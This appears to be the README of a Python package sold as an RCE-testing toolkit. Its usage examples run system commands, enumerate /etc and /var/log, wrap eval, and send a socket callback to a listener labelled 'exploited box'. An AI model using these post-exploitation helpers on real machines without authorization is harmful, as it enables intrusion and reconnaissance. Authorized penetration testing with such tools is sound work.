# mukeshkumar

A powerful single-file Python toolkit for Remote Code Execution (RCE) testing, file and directory enumeration, and Linux command execution.

> 🚨 For educational and authorized testing purposes only.

---

## 🔧 Features

- ✅ List files, folders, and recursively enumerate directories
- ✅ Run Linux commands and capture output
- ✅ Execute system-level calls
- ✅ Use `glob`, `pathlib`, and `os` modules together
- ✅ Optional socket callback support for RCE testing

---

## 📦 Installation

```bash
pip install mukeshkumar
````

---

## 🚀 Usage

```python
import mukeshkumar

# Run Linux command
print(mukeshkumar.run_command("uname -a"))

# List all files in /etc
print(mukeshkumar.list_files("/etc"))

# Recursive listing using pathlib
print(mukeshkumar.scan_pathlib("/var/log"))

# Run a command using os.system
mukeshkumar.run_os_system("ls -l")

# Send a callback to a listener
mukeshkumar.send_callback("192.168.1.100", 4444, "Ping from exploited box")

# Host information
print(mukeshkumar.get_host_info())
```

---

## 📁 Module Functions

### 📂 File Enumeration

* `list_all(path=".")`
* `list_files(path=".")`
* `list_dirs(path=".")`
* `recursive_glob(path=".", pattern="*")`
* `scan_pathlib(path=".")`

### ⚙️ Command Execution

* `run_command(cmd)`
* `run_os_system(cmd)`
* `safe_eval(code)` (⚠️ Dangerous — use for test only)

### 🌐 Network Utilities

* `get_host_info()`
* `send_callback(ip, port, msg)`

---


## ⚠️ Disclaimer

This tool is intended **only for ethical hacking, penetration testing, or system administration on systems you have explicit permission to test**. Any misuse is strictly prohibited and the author assumes no responsibility for illegal usage.

---

````
